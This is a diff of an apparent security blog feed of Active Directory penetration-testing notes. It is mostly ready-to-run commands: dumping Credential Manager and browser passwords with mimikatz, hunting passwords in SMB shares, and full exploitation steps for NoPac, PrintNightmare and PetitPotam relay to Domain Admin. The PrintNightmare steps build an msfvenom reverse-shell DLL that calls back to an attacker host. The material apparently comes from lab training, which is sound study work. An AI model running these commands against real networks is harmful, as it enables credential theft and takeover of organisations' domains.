+<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
+<li><code>%ProgramData%\Microsoft\Vault\</code></li>
+<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
+</ul>
+<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
+<li>Website passwords.</li>
+<li>Online account logins</li>
+</ul>
+<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
+<li>Network shares (like <code>\\server\share</code>)</li>
+<li>Domain user logins</li>
+<li>Services (OneDrive, etc.)</li>
+<li>Remote desktop connections</li>
+</ul>
+<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
+<p>For standard vaults </p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
+
+<p>For stored credentials</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
+
+
+<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
+<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
+<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
+<p>➜ This will create a new <code>powershell</code> process.</p>
+<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-DPAPI</tag>
       </tags>
   </entry>
   <entry>
@@ -1516,59 +1375,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DPAPI</title>
-    <url>/2025/11/26/DPAPI/</url>
-    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
-<ul>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
-<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
-<li><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></li>
-<li><code>%ProgramData%\Microsoft\Vault\</code></li>
-<li><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></li>
-</ul>
-<h2 id="Two-Main-Types-of-Stored-Credentials"><a href="#Two-Main-Types-of-Stored-Credentials" class="headerlink" title="Two Main Types of Stored Credentials:"></a>Two Main Types of Stored Credentials:</h2><h6 id="Web-Credentials"><a href="#Web-Credentials" class="headerlink" title="Web Credentials"></a>Web Credentials</h6><ul>
-<li>Website passwords.</li>
-<li>Online account logins</li>
-</ul>
-<h6 id="Windows-Credentials"><a href="#Windows-Credentials" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h6><ul>
-<li>Network shares (like <code>\\server\share</code>)</li>
-<li>Domain user logins</li>
-<li>Services (OneDrive, etc.)</li>
-<li>Remote desktop connections</li>
-</ul>
-<h2 id="Enumerate-All-vaults"><a href="#Enumerate-All-vaults" class="headerlink" title="Enumerate All vaults"></a>Enumerate All vaults</h2><p><code>➜ they are different, so we need to use both of them :</code></p>
-<p>For standard vaults </p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /list</span><br><span class="line"></span><br><span class="line">Currently loaded vaults:</span><br><span class="line"></span><br><span class="line">	Vault: Web Credentials</span><br><span class="line">	Vault Guid:<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault\<span class="number">4</span>BF4C442<span class="literal">-9B8A-41A0-B380-DD4A704DDB28</span></span><br><span class="line">	</span><br><span class="line">	Vault: Windows Credentials</span><br><span class="line">	Vault Guid:<span class="number">77</span>BC582B<span class="literal">-F0A6-4E15-4E80-61736B6F3B29</span></span><br><span class="line">	Location: C:\Users\sadams\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></table></figure>
-
-<p>For stored credentials</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Temp&gt; cmdkey /list </span><br><span class="line"></span><br><span class="line">Currently stored credentials: </span><br><span class="line"></span><br><span class="line">Target: WindowsLive: target=virtualapp/didlogical </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: <span class="number">02</span>jejfxhvabjneqt </span><br><span class="line">Local machine persistence </span><br><span class="line"></span><br><span class="line">Target: LegacyGeneric: target=onedrive.live.com </span><br><span class="line"><span class="built_in">Type</span>: Generic </span><br><span class="line">User: mcharles@inlanefreight.local</span><br><span class="line"></span><br><span class="line">Target: Domain:interactive=SRV01\mcharles</span><br><span class="line"><span class="built_in">Type</span>: Domain Password</span><br><span class="line">User: SRV01\mcharles</span><br></pre></td></tr></table></figure>
-
-
-<p>Credentials marked with <code>Local machine persistence</code> survive reboots.</p>
-<h2 id="Enumerate-Specific-vault"><a href="#Enumerate-Specific-vault" class="headerlink" title="Enumerate Specific vault"></a>Enumerate Specific vault</h2><h4 id="Web-Credentials-1"><a href="#Web-Credentials-1" class="headerlink" title="Web Credentials"></a>Web Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Web Credentials&quot;</span> /all</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Windows-Credentials-1"><a href="#Windows-Credentials-1" class="headerlink" title="Windows Credentials"></a>Windows Credentials</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sadams&gt; vaultcmd /listcreds:<span class="string">&quot;Windows Credentials&quot;</span> /all</span><br><span class="line"></span><br><span class="line">Credentials <span class="keyword">in</span> vault: Windows Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Domain Password Credential</span><br><span class="line">Resource: Domain:interactive=SRV01\mcharles</span><br><span class="line">Identity: SRV01\mcharles</span><br><span class="line"><span class="keyword">Hidden</span>: No</span><br><span class="line">Roaming: No</span><br><span class="line">Property (schema element id, value): (<span class="number">100</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<p><code>Important: If the resource includes interactive, the credentials were used in an interactive logon and may be reused to impersonate the user with runas</code>.</p>
-<h2 id="Impersonate-User-In-general-it-doesn’t-need-admin-privilege"><a href="#Impersonate-User-In-general-it-doesn’t-need-admin-privilege" class="headerlink" title="Impersonate User ( In general, it doesn’t need admin privilege )"></a>Impersonate User ( In general, it doesn’t need admin privilege )</h2><p>Since the <code>mcharles</code> credential is associated with an <code>interactive session</code>, we can attempt to impersonate the user using <code>runas</code> :</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">C:\Users\sadams&gt; runas /savecred /user:SRV01\mcharles powershell.exe</span><br><span class="line"></span><br><span class="line">Attempting to <span class="built_in">start</span> cmd as user <span class="string">&quot;SRV01\mcharles&quot;</span> ...</span><br></pre></td></tr></table></figure>
-<p>➜ This will create a new <code>powershell</code> process.</p>
-<h2 id="Dump-Credentials"><a href="#Dump-Credentials" class="headerlink" title="Dump Credentials"></a>Dump Credentials</h2><p>➜ We need <code>Local Administrator access on the machine</code>.</p>
-<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump all credentials from Credential Manager</span></span><br><span class="line">sekurlsa::credman</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump credentials with more details</span></span><br><span class="line">sekurlsa::vault</span><br><span class="line"></span><br><span class="line"><span class="comment"># List all credential vaults</span></span><br><span class="line">dpapi::vault /list</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt specific vault</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Microsoft\Vault\GUID\Policy.vpol&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump vault credentials</span></span><br><span class="line">dpapi::vault /<span class="keyword">in</span>:vaultfile /masterkey:masterkey</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt Chrome/Edge saved passwords</span></span><br><span class="line">dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Dump-Passwords</category>
-      </categories>
-      <tags>
-        <tag>Dump-DPAPI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>External Reconnaissance</title>
     <url>/2026/07/04/External-Reconnaissance/</url>
     <content><![CDATA[<blockquote>
@@ -1635,7 +1441,7 @@
         <category>Active Directory</category>
         <category>Exploitation</category>
         <category>Enumeration</category>
-        <category>External Reconnaissance</category>
+        <category>External Enumeration</category>
       </categories>
       <tags>
         <tag>OSINT</tag>
@@ -1703,6 +1509,200 @@
       </tags>
   </entry>
   <entry>
+    <title>Credential Hunting in Network Shares</title>
+    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
+    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
+
+
+<ul>
+<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
+<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
+</ul>
+<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We can also download the files locally:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
+
+<p>Then search for the pattern we want:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>Example result</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Service-Enumeration</category>
+        <category>SMB</category>
+      </categories>
+      <tags>
+        <tag>SMB</tag>
+        <tag>Enumeration</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bleeding-Edge &amp; Coercion</title>
+    <url>/2026/06/30/Bleeding-Edge-Coercion/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin. </p>
+</blockquote>
+<h2 id="NoPac-CVE-2021-42278-42287"><a href="#NoPac-CVE-2021-42278-42287" class="headerlink" title="NoPac (CVE-2021-42278 &#x2F; 42287)"></a>NoPac (CVE-2021-42278 &#x2F; 42287)</h2><blockquote>
+<p>➜ NoPac chains two bugs: we rename a machine account we create to match the DC’s name (42278), then request a service ticket after the DC object is restored, so the KDC issues us a ticket as the DC (42287). The result is a SYSTEM shell or a DCSync.</p>
+</blockquote>
+<h4 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h4><h5 id="Clone-NoPac"><a href="#Clone-NoPac" class="headerlink" title="Clone NoPac"></a>Clone NoPac</h5><blockquote>
+<p>➜ Clone the exploit repo :</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Ridter/noPac.git</span><br></pre></td></tr></table></figure>
+
+<h4 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Scan-Whether-the-Domain-Is-Vulnerable"><a href="#Scan-Whether-the-Domain-Is-Vulnerable" class="headerlink" title="Scan Whether the Domain Is Vulnerable"></a>Scan Whether the Domain Is Vulnerable</h5><blockquote>
+<p>➜ Run the bundled scanner to confirm the DC is exploitable before firing.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 scanner.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -use-ldap</span><br></pre></td></tr></table></figure>
+
+<h5 id="Pop-a-SYSTEM-Shell-on-the-DC"><a href="#Pop-a-SYSTEM-Shell-on-the-DC" class="headerlink" title="Pop a SYSTEM Shell on the DC"></a>Pop a SYSTEM Shell on the DC</h5><blockquote>
+<p>➜ Impersonate the administrator and drop into a semi-interactive SYSTEM shell.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 noPac.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -dc-host &lt;DC_HOST&gt; --impersonate administrator -use-ldap -shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="DCSync-Straight-to-a-Dump"><a href="#DCSync-Straight-to-a-Dump" class="headerlink" title="DCSync Straight to a Dump"></a>DCSync Straight to a Dump</h5><blockquote>
+<p>➜ Skip the shell and dump the administrator’s hash directly via DCSync.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 noPac.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt; -dc-ip &lt;DC_IP&gt; -dc-host &lt;DC_HOST&gt; --impersonate administrator -use-ldap -dump -just-dc-user &lt;DOMAIN&gt;/administrator</span><br></pre></td></tr></table></figure>
+
+<h2 id="PrintNightmare-CVE-2021-1675-34527"><a href="#PrintNightmare-CVE-2021-1675-34527" class="headerlink" title="PrintNightmare (CVE-2021-1675 &#x2F; 34527)"></a>PrintNightmare (CVE-2021-1675 &#x2F; 34527)</h2><blockquote>
+<p>➜ PrintNightmare abuses the Print Spooler service: a low-priv user makes the spooler load a malicious driver DLL, which runs as SYSTEM on the target.</p>
+</blockquote>
+<h4 id="Setup-1"><a href="#Setup-1" class="headerlink" title="Setup"></a>Setup</h4><h5 id="Clone-the-Exploit"><a href="#Clone-the-Exploit" class="headerlink" title="Clone the Exploit"></a>Clone the Exploit</h5><blockquote>
+<p>➜ Clone the exploit repo :</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cube0x0/CVE-2021-1675.git</span><br></pre></td></tr></table></figure>
+
+<h5 id="Remove-the-Default-Impacket"><a href="#Remove-the-Default-Impacket" class="headerlink" title="Remove the Default Impacket"></a>Remove the Default Impacket</h5><blockquote>
+<p>➜ This exploit requires cube0x0’s Impacket fork, so uninstall the current one first.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 uninstall impacket</span><br></pre></td></tr></table></figure>
+
+<h5 id="Clone-cube0x0’s-Impacket"><a href="#Clone-cube0x0’s-Impacket" class="headerlink" title="Clone cube0x0’s Impacket"></a>Clone cube0x0’s Impacket</h5><blockquote>
+<p>➜ Clone the required fork.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cube0x0/impacket</span><br></pre></td></tr></table></figure>
+
+<h5 id="Install-cube0x0’s-Impacket"><a href="#Install-cube0x0’s-Impacket" class="headerlink" title="Install cube0x0’s Impacket"></a>Install cube0x0’s Impacket</h5><blockquote>
+<p>➜ Install the fork so the exploit’s RPC calls work.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> impacket &amp;&amp; <span class="built_in">sudo</span> python3 ./setup.py install</span><br></pre></td></tr></table></figure>
+
+<h4 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Confirm-the-Spooler-RPC-Interface-Is-Reachable"><a href="#Confirm-the-Spooler-RPC-Interface-Is-Reachable" class="headerlink" title="Confirm the Spooler RPC Interface Is Reachable"></a>Confirm the Spooler RPC Interface Is Reachable</h5><blockquote>
+<p>➜ Check the target exposes MS-RPRN &#x2F; MS-PAR.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcdump.py @&lt;DC_IP&gt; | egrep <span class="string">&#x27;MS-RPRN|MS-PAR&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Generate-the-Payload-DLL"><a href="#Generate-the-Payload-DLL" class="headerlink" title="Generate the Payload DLL"></a>Generate the Payload DLL</h5><blockquote>
+<p>➜ Build a reverse-shell driver DLL.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;attacker&gt; LPORT=8080 -f dll -o backupscript.dll</span><br></pre></td></tr></table></figure>
+
+<h5 id="Host-the-DLL-on-an-SMB-Share"><a href="#Host-the-DLL-on-an-SMB-Share" class="headerlink" title="Host the DLL on an SMB Share"></a>Host the DLL on an SMB Share</h5><blockquote>
+<p>➜ Serve the DLL so the spooler can fetch it.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> smbserver.py -smb2support CompData /path/to/dll/</span><br></pre></td></tr></table></figure>
+
+<h5 id="Fire-the-Exploit"><a href="#Fire-the-Exploit" class="headerlink" title="Fire the Exploit"></a>Fire the Exploit</h5><blockquote>
+<p>➜ Force the spooler to load the DLL from our share, executing it as SYSTEM.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 CVE-2021-1675.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;DC_IP&gt; <span class="string">&#x27;\\&lt;attacker&gt;\CompData\backupscript.dll&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="PetitPotam-→-ADCS-Relay-CVE-2021-36942"><a href="#PetitPotam-→-ADCS-Relay-CVE-2021-36942" class="headerlink" title="PetitPotam → ADCS Relay (CVE-2021-36942)"></a>PetitPotam → ADCS Relay (CVE-2021-36942)</h2><blockquote>
+<p>➜ Coercion means forcing a machine to authenticate to us, PetitPotam coerces the DC to authenticate and we relay that authentication to the AD CS web-enrollment endpoint to request a certificate as the DC which we then use to DCSync.</p>
+</blockquote>
+<h4 id="Linux-Path"><a href="#Linux-Path" class="headerlink" title="Linux Path"></a>Linux Path</h4><h5 id="Relay-the-DC-Auth-to-the-CA"><a href="#Relay-the-DC-Auth-to-the-CA" class="headerlink" title="Relay the DC Auth to the CA"></a>Relay the DC Auth to the CA</h5><blockquote>
+<p>➜ Stand up the relay against the CA’s web-enrollment endpoint and request a DomainController certificate.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -debug -smb2support --target http://&lt;CA_HOST&gt;/certsrv/certfnsh.asp --adcs --template DomainController</span><br></pre></td></tr></table></figure>
+
+<h5 id="Coerce-the-DC-to-Authenticate"><a href="#Coerce-the-DC-to-Authenticate" class="headerlink" title="Coerce the DC to Authenticate"></a>Coerce the DC to Authenticate</h5><blockquote>
+<p>➜ Force the DC to authenticate to our relay.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 PetitPotam.py &lt;attacker_IP&gt; &lt;DC_IP&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Request-a-TGT-via-PKINIT"><a href="#Request-a-TGT-via-PKINIT" class="headerlink" title="Request a TGT via PKINIT"></a>Request a TGT via PKINIT</h5><blockquote>
+<p>➜ Use the captured base64 certificate to request a TGT for the DC account.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /opt/PKINITtools/gettgtpkinit.py &lt;DOMAIN&gt;/&lt;DC_NAME&gt;\$ -pfx-base64 &lt;BASE64_CERT&gt; dc01.ccache</span><br></pre></td></tr></table></figure>
+
+<h5 id="Export-the-Ticket"><a href="#Export-the-Ticket" class="headerlink" title="Export the Ticket"></a>Export the Ticket</h5><blockquote>
+<p>➜ Point Kerberos at the new ticket cache.</p>
+</blockquote>
